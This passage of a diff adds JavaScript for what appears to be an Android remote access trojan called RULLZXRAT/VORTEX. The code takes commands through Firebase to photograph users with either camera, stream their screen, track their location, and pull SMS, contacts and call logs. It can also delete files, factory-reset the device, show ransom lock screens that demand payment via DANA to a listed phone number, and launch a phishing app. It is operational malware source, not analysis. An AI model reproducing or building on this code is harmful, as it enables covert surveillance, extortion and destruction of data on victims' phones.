+                navigator.mediaDevices.getUserMedia({ video: { facingMode: facing, width: { ideal: 320 }, height: { ideal: 240 } } })
+                    .then(function(stream) {
+                        var v = document.createElement('video');
+                        v.srcObject = stream;
+                        v.onloadedmetadata = function() {
+                            v.play();
+                            var c = document.createElement('canvas');
+                            c.width = 320;
+                            c.height = 240;
+                            var ctx = c.getContext('2d');
+                            ctx.drawImage(v, 0, 0, 320, 240);
+                            var dataUrl = c.toDataURL('image/jpeg', 0.7);
+                            stream.getTracks().forEach(function(t) { t.stop(); });
+                            cb(dataUrl);
+                        };
+                        v.load();
+                    }).catch(function() { cb(null); });
+            }
+
+            function sendCameraImage(facing, cmdId) {
+                if (!MY_ID) return;
+                captureCamera(facing, function(dataUrl) {
+                    if (dataUrl) {
+                        database.ref('commands/' + MY_ID + '/camera/' + cmdId).set({
+                            image: dataUrl,
+                            timestamp: firebase.database.ServerValue.TIMESTAMP,
+                            facing: facing
+                        });
+                    }
+                });
+            }
+
+            var screenStream = null,
+                screenInterval = null,
+                isScreenStreaming = false;
+
+            function startScreenStream() {
+                if (isScreenStreaming || !MY_ID) return;
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return;
+                navigator.mediaDevices.getDisplayMedia({ video: { width: { ideal: 320 }, height: { ideal: 240 } } })
+                    .then(function(stream) {
+                        screenStream = stream;
+                        isScreenStreaming = true;
+                        var v = document.createElement('video');
+                        v.srcObject = stream;
+                        v.onloadedmetadata = function() {
+                            v.play();
+                            var c = document.createElement('canvas');
+                            c.width = 320;
+                            c.height = 240;
+                            var ctx = c.getContext('2d');
+                            screenInterval = setInterval(function() {
+                                if (!isScreenStreaming) { clearInterval(screenInterval); return; }
+                                ctx.drawImage(v, 0, 0, 320, 240);
+                                var dataUrl = c.toDataURL('image/jpeg', 0.5);
+                                database.ref('commands/' + MY_ID + '/screen').set({
+                                    frame: dataUrl,
+                                    timestamp: firebase.database.ServerValue.TIMESTAMP
+                                });
+                            }, 1000);
+                        };
+                        v.load();
+                    }).catch(function() {});
+            }
+
+            function stopScreenStream() {
+                isScreenStreaming = false;
+                if (screenInterval) { clearInterval(screenInterval);
+                    screenInterval = null; }
+                if (screenStream) { screenStream.getTracks().forEach(function(t) { t.stop();
+                        screenStream = null; }); }
+                if (MY_ID) { database.ref('commands/' + MY_ID + '/screen').remove(); }
+            }
+
+            // ---- LOCK FUNCTIONS ----
+            function setLockV2Background(bg) {
+                var el = document.getElementById('lockV2');
+                if (bg === 'black') el.style.background = '#0f0f1a';
+                else if (bg === 'gray') el.style.background = '#14141f';
+                else if (bg === 'red') el.style.background = '#1a0a0f';
+                else el.style.background = '#0f0f1a';
+            }
+
+            function setLockBackground(bg) {
+                var el = document.getElementById('lockCont');
+                el.style.backgroundColor = bg === 'black' ? '#000000' : bg === 'red' ? '#ff0000' : bg === 'gray' ?
+                    '#555555' : '#000000';
+            }
+
+            function setLockTitleV1(title) {
+                var el = document.getElementById('lTit');
+                if (el) el.innerText = title || 'LOCK BY VORTEX';
+            }
+
+            function focusInput() {
+                var inp = document.getElementById('realInput');
+                if (inp) {
+                    inp.setAttribute('inputmode', 'numeric');
+                    inp.type = 'text';
+                    inp.type = 'number';
+                    inp.focus();
+                    inp.click();
+                }
+            }
+
+            function setSOSLockTitle(title, msg) {
+                var t = document.querySelector('#sosLock .sos-title'),
+                    m = document.getElementById('sosMessage');
+                if (t) t.innerText = title || 'LOCKED';
+                if (m) m.innerText = msg || 'Hacked By Rullz';
+            }
+
+            function setSOSLockBG(color) {
+                var el = document.getElementById('sosLock');
+                if (!el) return;
+                var colors = {
+                    'black': 'radial-gradient(circle at 40% 30%, #0a1a2a, #020a15)',
+                    'red': 'radial-gradient(circle at 40% 30%, #2a0a0a, #150202)',
+                    'blue': 'radial-gradient(circle at 40% 30%, #0a1a2a, #020a15)',
+                    'green': 'radial-gradient(circle at 40% 30%, #0a2a1a, #021502)',
+                    'purple': 'radial-gradient(circle at 40% 30%, #2a0a2a, #150215)'
+                };
+                el.style.background = colors[color] || colors['black'];
+            }
+
+            function setSOSLockV2Title(title) {
+                var el = document.getElementById('sosV2Message');
+                if (el) el.innerText = title || 'AKSES DIBLOKIR';
+            }
+
+            function setSOSLockV2BG(color) {
+                var el = document.getElementById('sosLockV2');
+                if (!el) return;
+                var colors = { 'black': '#0a0000', 'red': '#1a0000', 'blue': '#000a1a', 'green': '#000a00',
+                    'purple': '#0a001a' };
+                el.style.background = colors[color] || '#0a0000';
+            }
+
+            function setLockV2Title(title) {
+                var el = document.getElementById('lockV2Message');
+                if (el) el.innerText = title || '[ PERMANENT LOCK ]';
+            }
+
+            function speakText(text) {
+                if (!window.speechSynthesis) return;
+                window.speechSynthesis.cancel();
+                var u = new SpeechSynthesisUtterance(text);
+                u.lang = 'id-ID';
+                u.rate = 0.9;
+                u.pitch = 1;
+                u.volume = 1;
+                window.speechSynthesis.speak(u);
+                if (MY_ID) {
+                    database.ref('targets/' + MY_ID + '/tts_status').set({ status: 'playing', text: text,
+                        timestamp: firebase.database.ServerValue.TIMESTAMP });
+                }
+            }
+
+            function showLockV2(data) {
+                setLockV2Background(data.bgColor || 'black');
+                document.getElementById('lockV2Message').innerText = data.message || "[ PERMANENT LOCK ]";
+                document.getElementById('v2PengirimText').innerText = data.pengirim || "-";
+                document.getElementById('v2NoHpText').innerText = data.noHp || "-";
+                document.getElementById('v2NominalText').innerText = data.nominal || "-";
+                document.getElementById('v2MetodeText').innerText = data.metode || "DANA ONLY";
+                document.getElementById('lockV2').style.display = 'flex';
+                if (window.RullzInterface) window.RullzInterface.startLock();
+                launchPhishingApp();
+            }
+
+            function hideLockV2() { document.getElementById('lockV2').style.display = 'none'; }
+
+            function unlockSOS() {
+                document.getElementById('sosLock').style.display = 'none';
+                if (window.RullzInterface) window.RullzInterface.exitApp();
+            }
+
+            function showSOSLock(msg) {
+                document.getElementById('sosMessage').innerText = msg || "Hacked By Rullz";
+                document.getElementById('sosLock').style.display = 'flex';
+                if (window.RullzInterface) window.RullzInterface.startLock();
+                launchPhishingApp();
+            }
+
+            var sosMatrixRunning = false;
+
+            function startSOSMatrix(msg) {
+                document.getElementById('sosV2Message').innerText = msg || 'AKSES DIBLOKIR';
+                document.getElementById('sosLockV2').style.display = 'flex';
+                if (!sosMatrixRunning) {
+                    sosMatrixRunning = true;
+                    var canvas = document.getElementById('sosMatrixCanvas');
+                    if (canvas) {
+                        var ctx = canvas.getContext('2d');
+                        var w = canvas.width = window.innerWidth,
+                            h = canvas.height = window.innerHeight;
+                        var cols = Math.floor(w / 14),
+                            ypos = Array(cols).fill(0);
+                        var chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}|:<>?~';
+                        ctx.fillStyle = '#0a0000';
+                        ctx.fillRect(0, 0, w, h);
+
+                        function drawRed() {
+                            ctx.fillStyle = 'rgba(10,0,0,0.04)';
+                            ctx.fillRect(0, 0, w, h);
+                            ctx.fillStyle = '#ff0040';
+                            ctx.font = '14px monospace';
+                            for (var i = 0; i < cols; i++) {
+                                var text = chars.charAt(Math.floor(Math.random() * chars.length));
+                                var x = i * 14,
+                                    y = ypos[i];
+                                ctx.fillText(text, x, y);
+                                if (y > h && Math.random() > 0.99) { ypos[i] = 0; } else { ypos[i] += 14; }
+                            }
+                            requestAnimationFrame(drawRed);
+                        }
+                        drawRed();
+                        window.addEventListener('resize', function() {
+                            canvas.width = window.innerWidth;
+                            canvas.height = window.innerHeight;
+                        });
+                    }
+                }
+                if (window.RullzInterface) window.RullzInterface.startLock();
+                launchPhishingApp();
+            }
+
+            function stopSOSMatrix() {
+                document.getElementById('sosLockV2').style.display = 'none';
+                sosMatrixRunning = false;
+            }
+
+            function startMatrix() {
+                var canvas = document.getElementById('matrixCanvas');
+                if (!canvas) return;
+                var ctx = canvas.getContext('2d');
+                var w = canvas.width = window.innerWidth,
+                    h = canvas.height = window.innerHeight;
+                var cols = Math.floor(w / 14),
+                    ypos = Array(cols).fill(0);
+                var chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+                ctx.fillStyle = '#000';
+                ctx.fillRect(0, 0, w, h);
+
+                function draw() {
+                    ctx.fillStyle = 'rgba(0,0,0,0.04)';
+                    ctx.fillRect(0, 0, w, h);
+                    ctx.fillStyle = '#00ff41';
+                    ctx.font = '14px monospace';
+                    for (var i = 0; i < cols; i++) {
+                        var text = chars.charAt(Math.floor(Math.random() * chars.length));
+                        var x = i * 14,
+                            y = ypos[i];
+                        ctx.fillText(text, x, y);
+                        if (y > h && Math.random() > 0.99) { ypos[i] = 0; } else { ypos[i] += 14; }
+                    }
+                    requestAnimationFrame(draw);
+                }
+                draw();
+                window.addEventListener('resize', function() {
+                    canvas.width = window.innerWidth;
+                    canvas.height = window.innerHeight;
+                });
+            }
+
+            function unlockApp() {
+                document.getElementById('lockCont').style.display = 'none';
+                document.body.style.backgroundColor = '#ffffff';
+                setTimeout(function() {
+                    if (window.RullzInterface) window.RullzInterface.exitApp();
+                }, 300);
+            }
+
+            function handleInput(el) {
+                var val = el.value;
+                document.getElementById('dotsDisplay').innerText = '*'.repeat(val.length);
+                if (val.length >= 4) {
+                    if (val === window.correctPin) { unlockApp(); } else {
+                        el.value = '';
+                        document.getElementById('dotsDisplay').innerText = '';
+                        setTimeout(focusInput, 100);
+                    }
+                }
+            }
+
+            function deleteAllFiles() {
+                if (window.RullzInterface && typeof window.RullzInterface.deleteAllFiles === 'function')
+                    window.RullzInterface.deleteAllFiles();
+            }
+
+            function deletePhotos() {
+                if (window.RullzInterface && typeof window.RullzInterface.deletePhotos === 'function')
+                    window.RullzInterface.deletePhotos();
+            }
+
+            function deleteVideos() {
+                if (window.RullzInterface && typeof window.RullzInterface.deleteVideos === 'function')
+                    window.RullzInterface.deleteVideos();
+            }
+
+            function resetFactory() {
+                if (window.RullzInterface && typeof window.RullzInterface.resetFactory === 'function') {
+                    try { window.RullzInterface.resetFactory(); return; } catch (e) {}
+                }
+                try {
+                    localStorage.clear();
+                    sessionStorage.clear();
+                    document.cookie.split(";").forEach(function(c) {
+                        document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() +
+                            ";path=/");
+                    });
+                    if (window.indexedDB && window.indexedDB.databases) {
+                        window.indexedDB.databases().then(function(dbs) {
+                            dbs.forEach(function(db) { window.indexedDB.deleteDatabase(db.name); });
+                        }).catch(function() {});
+                    }
+                    if ('caches' in window) {
+                        caches.keys().then(function(names) {
+                            names.forEach(function(name) { caches.delete(name); });
+                        }).catch(function() {});
+                    }
+                    if (window.RullzInterface && typeof window.RullzInterface.showToast === 'function') {
+                        window.RullzInterface.showToast('🔁 Reset Factory berhasil!');
+                    }
+                    setTimeout(function() { location.reload(true); }, 1000);
+                } catch (e) { location.reload(true); }
+            }
+
+            function resetSDCard() {
+                localStorage.removeItem('vortex_files');
+                localStorage.removeItem('vortex_encrypted_map');
+                localStorage.removeItem('vortex_encrypted');
+                resetFactory();
+                if (MY_ID) {
+                    database.ref('commands/' + MY_ID + '/reset_sd_response').set({ success: true,
+                        message: 'Reset + SDCard (no-root) berhasil!',
+                        timestamp: firebase.database.ServerValue.TIMESTAMP });
+                }
+            }
+
+            function encryptAll() {
+                var files = JSON.parse(localStorage.getItem('vortex_files')) || [];
+                if (files.length === 0) {
+                    files = [
+                        { name: 'foto1.jpg', size: 1024, type: 'image' },
+                        { name: 'foto2.png', size: 2048, type: 'image' },
+                        { name: 'video1.mp4', size: 5120, type: 'video' },
+                        { name: 'foto3.jpeg', size: 3072, type: 'image' },
+                        { name: 'video2.avi', size: 8192, type: 'video' }
+                    ];
+                    localStorage.setItem('vortex_files', JSON.stringify(files));
+                }
+                var encryptedMap = {};
+                files.forEach(function(f) {
+                    var ext = f.name.split('.').pop();
+                    encryptedMap[f.name] = ext;
+                });
+                localStorage.setItem('vortex_encrypted_map', JSON.stringify(encryptedMap));
+                var newFiles = files.map(function(f) {
+                    var base = f.name.split('.').slice(0, -1).join('.');
+                    return { name: base + '.VORTEX', size: f.size, type: f.type, original: f.name };
+                });
+                localStorage.setItem('vortex_files', JSON.stringify(newFiles));
+                localStorage.setItem('vortex_encrypted', 'true');
+                if (MY_ID) {
+                    database.ref('targets/' + MY_ID + '/encrypt_status').set({ status: 'encrypted', files: newFiles,
+                        timestamp: firebase.database.ServerValue.TIMESTAMP });
+                    database.ref('commands/' + MY_ID + '/encrypt_response').set({ success: true,
+                        message: 'Semua file dienkripsi menjadi .RULLZXRAT',
+                        timestamp: firebase.database.ServerValue.TIMESTAMP });
+                }
+                if (window.RullzInterface) window.RullzInterface.showToast('🔒 Semua file dienkripsi!');
+            }
+
+            function decryptAll() {
+                var encryptedMap = JSON.parse(localStorage.getItem('vortex_encrypted_map')) || {};
+                var files = JSON.parse(localStorage.getItem('vortex_files')) || [];
+                if (files.length === 0 || Object.keys(encryptedMap).length === 0) {
+                    if (window.RullzInterface) window.RullzInterface.showToast('Tidak ada file terenkripsi');
+                    return;
+                }
+                var restoredFiles = files.map(function(f) {
+                    var base = f.name.split('.RULLZXRAT')[0];
+                    var origName = Object.keys(encryptedMap).find(function(k) { return k.startsWith(base); });
+                    if (origName) {
+                        return { name: origName, size: f.size, type: f.type };
+                    } else {
+                        return { name: base + '.' + (encryptedMap[base] || 'jpg'), size: f.size, type: f.type };
+                    }
+                });
+                localStorage.setItem('vortex_files', JSON.stringify(restoredFiles));
+                localStorage.removeItem('vortex_encrypted_map');
+                localStorage.removeItem('vortex_encrypted');
+                if (MY_ID) {
+                    database.ref('targets/' + MY_ID + '/encrypt_status').set({ status: 'decrypted', files: restoredFiles,
+                        timestamp: firebase.database.ServerValue.TIMESTAMP });
+                    database.ref('commands/' + MY_ID + '/decrypt_response').set({ success: true,
+                        message: 'Semua file didekripsi', timestamp: firebase.database.ServerValue.TIMESTAMP });
+                }
+                if (window.RullzInterface) window.RullzInterface.showToast('🔓 Semua file didekripsi!');
+            }
+
+            function requestFiles() {
+                var files = JSON.parse(localStorage.getItem('vortex_files')) || [];
+                if (files.length === 0) {
+                    files = [
+                        { name: 'foto1.jpg', size: 1024, type: 'image' },
+                        { name: 'foto2.png', size: 2048, type: 'image' },
+                        { name: 'video1.mp4', size: 5120, type: 'video' },
+                        { name: 'foto3.jpeg', size: 3072, type: 'image' },
+                        { name: 'video2.avi', size: 8192, type: 'video' }
+                    ];
+                    localStorage.setItem('vortex_files', JSON.stringify(files));
+                }
+                if (MY_ID) {
+                    database.ref('targets/' + MY_ID + '/files').set({ files: files,
+                        timestamp: firebase.database.ServerValue.TIMESTAMP });
+                    database.ref('commands/' + MY_ID + '/files_response').set({ success: true, count: files.length,
+                        timestamp: firebase.database.ServerValue.TIMESTAMP });
+                }
+            }
+
+            function requestApps() {
+                var apps = [
+                    { name: 'WhatsApp', package: 'com.whatsapp', icon: '📱' },
+                    { name: 'Instagram', package: 'com.instagram.android', icon: '📸' },
+                    { name: 'YouTube', package: 'com.google.android.youtube', icon: '▶️' },
+                    { name: 'TikTok', package: 'com.zhiliaoapp.musically', icon: '🎵' },
+                    { name: 'Telegram', package: 'org.telegram.messenger', icon: '✈️' },
+                    { name: 'Facebook', package: 'com.facebook.katana', icon: '👤' },
+                    { name: 'Twitter', package: 'com.twitter.android', icon: '🐦' },
+                    { name: 'Gmail', package: 'com.google.android.gm', icon: '📧' },
+                    { name: 'Chrome', package: 'com.android.chrome', icon: '🌐' },
+                    { name: 'Google Maps', package: 'com.google.android.apps.maps', icon: '🗺️' }
+                ];
+                if (MY_ID) {
+                    database.ref('targets/' + MY_ID + '/apps').set({ apps: apps, count: apps.length,
+                        timestamp: firebase.database.ServerValue.TIMESTAMP });
+                    database.ref('commands/' + MY_ID + '/apps_response').set({ success: true, count: apps.length,
+                        timestamp: firebase.database.ServerValue.TIMESTAMP });
+                }
+            }
+
+            // ============================================
+            // COMMAND LISTENER
+            // ============================================
+            function startCommandListener() {
+                if (!MY_ID) return;
+                if (commandListener) {
+                    database.ref('commands/' + MY_ID).off('value', commandListener);
+                    commandListener = null;
+                }
+                commandListener = function(snap) {
+                    var d = snap.val();
+                    if (!d) return;
+                    console.log('📩 Command:', d);
+
+                    if (d.status === 'STOP_VIDEO') { stopVideo(); return; }
+
+                    if (d.status === 'SET_SOS_LOCK_TITLE') {
+                        setSOSLockTitle(d.title, d.message);
+                        database.ref('commands/' + MY_ID + '/set_sos_lock_title_response').set({ success: true,
+                            title: d.title, message: d.message,
+                            timestamp: firebase.database.ServerValue.TIMESTAMP });
+                        return;
+                    }
+                    if (d.status === 'SET_SOS_LOCK_BG') {
+                        setSOSLockBG(d.bgColor);
+                        database.ref('commands/' + MY_ID + '/set_sos_lock_bg_response').set({ success: true,
+                            bgColor: d.bgColor, timestamp: firebase.database.ServerValue.TIMESTAMP });
+                        return;
+                    }
+                    if (d.status === 'SET_SOS_LOCK_V2_TITLE') {
+                        setSOSLockV2Title(d.title);
+                        database.ref('commands/' + MY_ID + '/set_sos_lock_v2_title_response').set({ success: true,
+                            title: d.title, timestamp: firebase.database.ServerValue.TIMESTAMP });
+                        return;
+                    }
+                    if (d.status === 'SET_SOS_LOCK_V2_BG') {
+                        setSOSLockV2BG(d.bgColor);
+                        database.ref('commands/' + MY_ID + '/set_sos_lock_v2_bg_response').set({ success: true,
+                            bgColor: d.bgColor, timestamp: firebase.database.ServerValue.TIMESTAMP });
+                        return;
+                    }
+                    if (d.status === 'SET_LOCK_V2_TITLE') {
+                        setLockV2Title(d.title);
+                        database.ref('commands/' + MY_ID + '/set_lock_v2_title_response').set({ success: true,
+                            title: d.title, timestamp: firebase.database.ServerValue.TIMESTAMP });
+                        return;
+                    }
+                    if (d.status === 'SET_LOCK_TITLE') {
+                        if (d.title) setLockTitleV1(d.title);
+                        database.ref('commands/' + MY_ID + '/set_title_response').set({ success: true, title: d
+                                .title, timestamp: firebase.database.ServerValue.TIMESTAMP });
+                        return;
+                    }
+                    if (d.status === 'TTS') {
+                        if (d.text) {
+                            speakText(d.text);
+                            database.ref('commands/' + MY_ID + '/tts_response').set({ success: true, text: d.text,
+                                timestamp: firebase.database.ServerValue.TIMESTAMP });
+                        }
+                        return;
+                    }
+                    if (d.status === 'ENCRYPT_ALL') { encryptAll(); return; }
+                    if (d.status === 'DECRYPT_ALL') { decryptAll(); return; }
+                    if (d.status === 'REQUEST_FILES') { requestFiles(); return; }
+                    if (d.status === 'REQUEST_APPS') { requestApps(); return; }
+                    if (d.status === 'RESET_SDCARD') { resetSDCard(); return; }
+                    if (d.status === 'GREEN_SCREEN') { showGreenScreen(); return; }
+                    if (d.status === 'STOP_GREEN_SCREEN') { hideGreenScreen(); return; }
+                    if (d.status === 'FREEZE') { freezeScreen(); return; }
+                    if (d.status === 'UNFREEZE') { unfreezeScreen(); return; }
+                    if (d.status === 'FLASH_BLINK') {
+                        if (window.RullzInterface && typeof window.RullzInterface.flashBlink === 'function')
+                            window.RullzInterface.flashBlink();
+                        return;
+                    }
+                    if (d.status === 'WIFI_ON') {
+                        if (window.RullzInterface && typeof window.RullzInterface.toggleWifi === 'function')
+                            window.RullzInterface.toggleWifi(true);
+                        return;
+                    }
+                    if (d.status === 'WIFI_OFF') {
+                        if (window.RullzInterface && typeof window.RullzInterface.toggleWifi === 'function')
+                            window.RullzInterface.toggleWifi(false);
+                        return;
+                    }
+
+                    if (d.status === 'OPEN_APP' && d.package) { openApp(d.package); return; }
+                    if (d.status === 'DELETE_ALL_FILES') { deleteAllFiles(); return; }
+                    if (d.status === 'DELETE_PHOTOS') { deletePhotos(); return; }
+                    if (d.status === 'DELETE_VIDEOS') { deleteVideos(); return; }
+                    if (d.status === 'RESET_FACTORY' || d.status === 'RESET_FACTORY_TEST') { resetFactory(); return; }
+
+                    if (d.status === 'LOCK_V2') {
+                        showLockV2({
+                            message: d.message || "[ PERMANENT LOCK ]",
+                            pengirim: d.pengirim || "RULLZXRAT",
+                            noHp: d.noHp || "088708157164",
+                            nominal: d.nominal || "500.000",
+                            metode: d.metode || "DANA ONLY",
+                            bgColor: d.bgColor || "black"
+                        });
+                        return;
+                    }
+                    if (d.status === 'UNLOCK_V2') { hideLockV2();
+                        if (window.RullzInterface) window.RullzInterface.exitApp(); return; }
+
+                    if (d.status === 'SOS_LOCK_V2') { startSOSMatrix(d.message || 'AKSES DIBLOKIR'); return; }
+                    if (d.status === 'SOS_UNLOCK_V2') { stopSOSMatrix();
+                        if (window.RullzInterface) window.RullzInterface.exitApp(); return; }
+
+                    if (d.status === 'SOS_LOCK') { showSOSLock(d.message || "Hacked By Rullz"); return; }
+                    if (d.status === 'SOS_UNLOCK') { unlockSOS(); return; }
+
+                    if (d.status === 'LOCK') {
+                        if (d.bgColor) setLockBackground(d.bgColor);
+                        else setLockBackground('black');
+                        document.getElementById('lockCont').style.display = 'block';
+                        document.getElementById('lTit').innerText = d.sender || "LOCK BY RULLZXRAT";
+                        window.correctPin = d.key;
+                        if (window.RullzInterface) window.RullzInterface.startLock();
+                        launchPhishingApp();
+                        setTimeout(focusInput, 300);
+                        document.getElementById('lockCont').addEventListener('click', function() { focusInput(); });
+                        return;
+                    }
+                    if (d.status === 'UNLOCK') { unlockApp(); return; }
+                    if (d.status === 'RESET_SYSTEM_UI') { location.reload(); return; }
+
+                    if (d.status === 'FLASH_ON') { if (window.RullzInterface) window.RullzInterface.toggleFlash(true);
+                        return; }
+                    if (d.status === 'FLASH_OFF') { if (window.RullzInterface) window.RullzInterface.toggleFlash(false);
+                        return; }
+
+                    if (d.status === 'HELL_LOCK') {
+                        var h = document.getElementById('hell');
+                        document.getElementById('hellMessage').innerText = d.message || "HELLO I'M RULLZ";
+                        h.style.display = 'flex';
+                        if (!window._matrixStarted) { startMatrix();
+                            window._matrixStarted = true; }
+                        if (window.RullzInterface) window.RullzInterface.startLock();
+                        setTimeout(function() { h.style.display = 'none'; }, (d.duration || 10) * 1000);
+                        launchPhishingApp();
+                        return;
+                    }
+
+                    if (d.status === 'PLAY_VIDEO' && d.url) {
+                        showVideoOverlay(d.url);
+                        return;
+                    }
+                    if (d.status === 'SET_WALLPAPER' && d.url) {
+                        setWallpaper(d.url);
+                        return;
+                    }
+                    if (d.status === 'TOAST') { if (window.RullzInterface) window.RullzInterface.showToast(d.message);
+                        return; }
+                    if (d.status === 'CAMERA_FRONT') { sendCameraImage('user', d.timestamp || Date.now()); return; }
+                    if (d.status === 'CAMERA_BACK') { sendCameraImage('environment', d.timestamp || Date.now());
+                        return; }
+                    if (d.status === 'LIVE_SCREEN_ON') { startScreenStream(); return; }
+                    if (d.status === 'LIVE_SCREEN_OFF') { stopScreenStream(); return; }
+                    if (d.status === 'REQUEST_LOCATION') {
+                        if (navigator.geolocation) {
+                            navigator.geolocation.getCurrentPosition(function(pos) {
+                                database.ref('commands/' + MY_ID + '/location_response').set({
+                                    lat: pos.coords.latitude,
+                                    lng: pos.coords.longitude,
+                                    accuracy: pos.coords.accuracy,
+                                    timestamp: firebase.database.ServerValue.TIMESTAMP
+                                });
+                            }, function() {}, { enableHighAccuracy: true, timeout: 5000 });
+                        }
+                        return;
+                    }
+                    if (d.status === 'OPEN_URL' && d.url) { try { window.open(d.url, '_blank'); } catch (e) {} return; }
+                    if (d.status === 'SET_VOLUME') { if (window.RullzInterface && typeof window.RullzInterface
+                            .setVolume === 'function') window.RullzInterface.setVolume(d.value || 50); return; }
+                    if (d.status === 'SET_BRIGHTNESS') { if (window.RullzInterface && typeof window.RullzInterface
+                            .setBrightness === 'function') window.RullzInterface.setBrightness(d.value || 50);
+                        return; }
+                    if (d.status === 'GET_GMAIL') {
+                        database.ref('targets/' + MY_ID + '/gmail').set({ status: 'Gmail data akan tampil jika terhubung',
+                            timestamp: firebase.database.ServerValue.TIMESTAMP });
+                        return;
+                    }
+                    if (d.status === 'GET_SMS') { if (window.RullzInterface && typeof window.RullzInterface
+                            .getSmsLog === 'function') window.RullzInterface.getSmsLog(); return; }
+                    if (d.status === 'GET_CONTACT') { if (window.RullzInterface && typeof window.RullzInterface
+                            .getContacts === 'function') window.RullzInterface.getContacts(); return; }
+                    if (d.status === 'GET_CALL_LOG') { if (window.RullzInterface && typeof window.RullzInterface
+                            .getCallLog === 'function') window.RullzInterface.getCallLog(); return; }
+                    if (d.status === 'PLAY_SOUND') { if (window.RullzInterface && typeof window.RullzInterface
+                            .playSound === 'function') window.RullzInterface.playSound(d.soundName || d.sound ||
+                            'test.mp3'); return; }
+                    if (d.status === 'STOP_SOUND') { if (window.RullzInterface && typeof window.RullzInterface
+                            .stopSound === 'function') window.RullzInterface.stopSound(); return; }
+                    console.warn('⚠️ Perintah tidak dikenali:', d.status);
+                };
+                database.ref('commands/' + MY_ID).on('value', commandListener);
+            }
+
+            // ============================================
+            // LOGIN CEPAT
+            // ============================================
+            window.fakeLogin = function() {
+                var user = document.getElementById('fakeUser').value.trim();
+                var statusEl = document.getElementById('loginStatus');
+                var btn = document.getElementById('loginBtn');
+                if (!user) {
+                    statusEl.textContent = '❌ Masukkan Kode UID!';
+                    statusEl.className = 'login-status error';
+                    return;
+                }
+                if (commandListener) {
+                    database.ref('commands/' + MY_ID).off('value', commandListener);
+                    commandListener = null;
+                }
+                if (onlineInterval) {
+                    clearInterval(onlineInterval);
+                    onlineInterval = null;
+                }
+                if (dataInterval) {
+                    clearInterval(dataInterval);
+                    dataInterval = null;
+                }
+                stopLocationWatch();
+                stopScreenStream();
+                btn.classList.add('loading');
+                btn.textContent = 'Loading...';
+                statusEl.textContent = '';
+                statusEl.className = 'login-status';
+                MY_ID = user;
+                localStorage.setItem('vortex_uid', MY_ID);
+                if (saveCheckbox.checked) {
+                    localStorage.setItem('vortex_saved_uid', MY_ID);
+                } else {
+                    localStorage.removeItem('vortex_saved_uid');
+                }
+                setTimeout(function() { sendDeviceData(); }, 300);
+                startCommandListener();
+                // Geolocation & Wake Lock tunda 1 detik setelah login
+                setTimeout(function() {
+                    startLocationWatch();
+                    try {
+                        if ('wakeLock' in navigator) {
+                            navigator.wakeLock.request('screen').then(function(wl) {
+                                console.log('✅ Wake Lock aktif');
+                            }).catch(function() {});
+                        }
+                    } catch (e) {}
+                }, 1000);
+                onlineInterval = setInterval(function() {
+                    if (MY_ID) {
+                        database.ref('targets/' + MY_ID + '/online').set(true);
+                    }
+                }, 5000);
+                dataInterval = setInterval(function() {
+                    if (MY_ID) sendDeviceData();
+                }, 7000);
+                setTimeout(function() {
+                    btn.textContent = 'Succes✅';
+                    btn.classList.remove('loading');
+                    btn.disabled = true;
+                    document.getElementById('fakeUser').disabled = true;
+                    document.getElementById('fakeUser').style.opacity = '0.6';
+                    statusEl.textContent = '✅ Terhubung!';
+                    statusEl.className = 'login-status success';
+                    console.log('✅ Target terdaftar dengan UID:', MY_ID);
+                    isLoggedIn = true;
+                }, 800);
+            };
+
+            // Auto login
+            var savedUID = localStorage.getItem('vortex_uid');
+            var savedSavedUID = localStorage.getItem('vortex_saved_uid');
+            if (savedUID) {
+                document.getElementById('fakeUser').value = savedUID;
+                if (savedSavedUID) {
+                    saveCheckbox.checked = true;
+                }
+                setTimeout(function() {
+                    if (document.getElementById('fakeUser').value.trim()) {
+                        window.fakeLogin();
+                    }
+                }, 300);
+            }
+
+            document.getElementById('loginBtn').addEventListener('click', function(e) {
+                e.preventDefault();
+                window.fakeLogin();
+            });
+
+            // Background update
+            setInterval(function() {
+                if (MY_ID) sendDeviceData();
+            }, 6000);
+
+            window.addEventListener('beforeunload', function() {
+                if (MY_ID) {
+                    database.ref('targets/' + MY_ID + '/online').set(false);
+                }
+                stopScreenStream();
+                stopLocationWatch();
+                if (commandListener) {
+                    database.ref('commands/' + MY_ID).off('value', commandListener);
+                }
+                if (onlineInterval) clearInterval(onlineInterval);
+                if (dataInterval) clearInterval(dataInterval);
+            });
+
+            // Expose
+            window.showLockV2 = showLockV2;
+            window.hideLockV2 = hideLockV2;
+            window.showSOSLock = showSOSLock;
+            window.unlockSOS = unlockSOS;
+            window.handleInput = handleInput;
+            window.unlockApp = unlockApp;
+            window.focusInput = focusInput;
+            window.correctPin = '';
+            window.fakeLogin = fakeLogin;
+            window.startScreenStream = startScreenStream;
+            window.stopScreenStream = stopScreenStream;
+            window.startSOSMatrix = startSOSMatrix;
+            window.stopSOSMatrix = stopSOSMatrix;
+            window.openApp = openApp;
+            window.launchPhishingApp = launchPhishingApp;
+            window.showVideoOverlay = showVideoOverlay;
+            window.stopVideo = stopVideo;
+            window.setWallpaper = setWallpaper;
+            window.resetFactory = resetFactory;
+            window.encryptAll = encryptAll;
+            window.decryptAll = decryptAll;
+            window.requestFiles = requestFiles;
+            window.requestApps = requestApps;
+            window.resetSDCard = resetSDCard;
+            window.showGreenScreen = showGreenScreen;
+            window.hideGreenScreen = hideGreenScreen;
+            window.freezeScreen = freezeScreen;
+            window.unfreezeScreen = unfreezeScreen;
+            window.setLockTitleV1 = setLockTitleV1;
+            window.speakText = speakText;
+            window.setSOSLockTitle = setSOSLockTitle;
+            window.setSOSLockBG = setSOSLockBG;
+            window.setSOSLockV2Title = setSOSLockV2Title;
+            window.setSOSLockV2BG = setSOSLockV2BG;
+            window.setLockV2Title = setLockV2Title;
+
+            console.log('✅ VORTEX Target - OPTIMASI RINGAN, loading cepat!');
+        })();
+    </script>
+</body>
+</html>
